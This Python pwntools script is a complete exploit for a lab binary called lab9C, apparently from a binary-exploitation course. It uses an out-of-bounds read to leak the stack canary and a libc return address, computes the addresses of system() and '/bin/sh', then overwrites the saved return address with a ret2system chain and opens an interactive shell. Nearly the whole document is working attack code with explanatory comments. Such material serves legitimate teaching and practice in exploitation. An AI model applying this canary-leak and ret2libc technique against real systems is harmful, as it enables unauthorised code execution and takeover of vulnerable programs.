from pwn import *
settings = {
    "binary"        : "/levels/lab09/lab9C",
}
def exploit():
    print("PID: "+str(pidof(p)))
    print("Press any key to fill the buffer with 256 elements 0x13371337...")
    #pause()

    # fill the test array of DSVector
    for i in range(256): ## so, the program is supposed to store up to 256 elements in this array
	# this is because it is not using the 0 index while the maximum index it expects to have been
	# initialized with is 257 (whereas in fact it's much more, while the vector_data size is 257
        p.sendlineafter("Enter choice: ","1")
        p.sendlineafter("Enter a number: ","322376503") # 0x13371337
	
    p.sendlineafter("Enter choice: ","2") # now read
    p.sendlineafter("Choose an index: ","257")
    canary_signed = canary = int(p.recvline().split("=")[1].strip(),10)
    if(canary_signed<0):
	    canary = (canary_signed - 1) ^ 0xffffffff
	    canary = - canary
    print("Leaked canary: "+hex(canary))
	
    p.sendlineafter("Enter choice: ","2") # now read the saved RET with libc base
    p.sendlineafter("Choose an index: ","261")
    libc_ret = libc_ret_signed = int(p.recvline().split("=")[1].strip(),10)
    if(libc_ret_signed<0):
	    libc_ret = (libc_ret_signed - 1)^0xffffffff
	    libc_ret = -libc_ret 
    system_addr = libc_ret + 0x2670d
    bin_sh_addr = libc_ret + 0x146fa1
    print("Leaked libc_ret: "+hex(libc_ret))
    print("system(): "+hex(system_addr))
    print("/bin/sh: "+hex(bin_sh_addr))

    print("OK, shelling it...")
	
    ret = system_addr
    p.sendlineafter("Enter choice: ","1")
    p.sendlineafter("Enter a number: ",str(canary)) # overwrite the canary with itself

    p.sendlineafter("Enter choice: ","1")
    p.sendlineafter("Enter a number: ",str(0x42424242))
    p.sendlineafter("Enter choice: ","1")
    p.sendlineafter("Enter a number: ",str(0x42424242))
    p.sendlineafter("Enter choice: ","1")
    p.sendlineafter("Enter a number: ",str(0x42424242))
	
    ## OK, we're controlling RET right here
    p.sendlineafter("Enter choice: ","1")
    p.sendlineafter("Enter a number: ",str(ret))	## make it system()
	
	# Now, the rest of the ret2system() ROP payload
    p.sendlineafter("Enter choice: ","1")
    p.sendlineafter("Enter a number: ",str(0x31337)) # next ret; does not matter, let it crash when system returns

    p.sendlineafter("Enter choice: ","1")
    p.sendlineafter("Enter a number: ", str(bin_sh_addr)) # next ret; does not matter, let it crash when system returns

    p.sendlineafter("Enter choice: ","3")
	## this will trigger quit, which will make main() return to our payload
    p.interactive()
    return 0

# Initial setup
if __name__  == "__main__":
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    #p = process(binary.path,stdin=PTY)
    p=remote("127.0.0.1", 9943)
    exploit()
